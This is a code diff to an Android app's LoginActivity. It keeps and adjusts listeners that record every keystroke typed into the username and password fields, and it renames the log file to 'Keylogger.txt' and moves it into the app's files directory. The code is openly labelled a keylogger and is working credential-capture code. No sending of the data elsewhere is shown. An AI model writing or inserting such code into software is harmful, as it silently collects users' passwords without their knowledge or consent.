@@ -45,16 +45,16 @@ public class LoginActivity extends AppCompatActivity {
                     }
                     else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_DEL){
                         String keylog  = "Key Pressed in Username:{BACKSPACE}\n";
-                        writeToFile("Keylogger", keylog);
+                        writeToFile("Keylogger.txt", keylog);
                     }
                     else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER){
                         String keylog  = "Key Pressed in Username:{ENTER}\n";
-                        writeToFile("Keylogger", keylog);
+                        writeToFile("Keylogger.txt", keylog);
                     }
                     else{
                         char key = (char) keyEvent.getUnicodeChar();
                         String keylog  = "Key Pressed in Username:{" + key + "}\n";
-                        writeToFile("Keylogger", keylog);
+                        writeToFile("Keylogger.txt", keylog);
                     }
                 }
                 return false;
@@ -70,16 +70,16 @@ public class LoginActivity extends AppCompatActivity {
                     }
                     else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_DEL){
                         String keylog  = "Key Pressed in Password:{BACKSPACE}\n";
-                        writeToFile("Keylogger", keylog);
+                        writeToFile("Keylogger.txt", keylog);
                     }
                     else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER){
                         String keylog  = "Key Pressed in Username:{ENTER}\n";
-                        writeToFile("Keylogger", keylog);
+                        writeToFile("Keylogger.txt", keylog);
                     }
                     else{
                         char key = (char) keyEvent.getUnicodeChar();
                         String keylog  = "Key Pressed in Password:{" + key + "}\n";
-                        writeToFile("Keylogger", keylog);
+                        writeToFile("Keylogger.txt", keylog);
                     }
                 }
                 return false;
@@ -124,10 +124,7 @@ public class LoginActivity extends AppCompatActivity {
     }
 
     public void writeToFile(String fileName, String content) {
-        File file = new File(LoginActivity.this.getFilesDir(), "text");
-        if (!file.exists()) {
-            file.mkdir();
-        }
+        File file = new File(LoginActivity.this.getFilesDir().getPath());
         try {
             File gpxfile = new File(file, fileName);
             FileWriter writer = new FileWriter(gpxfile, true);
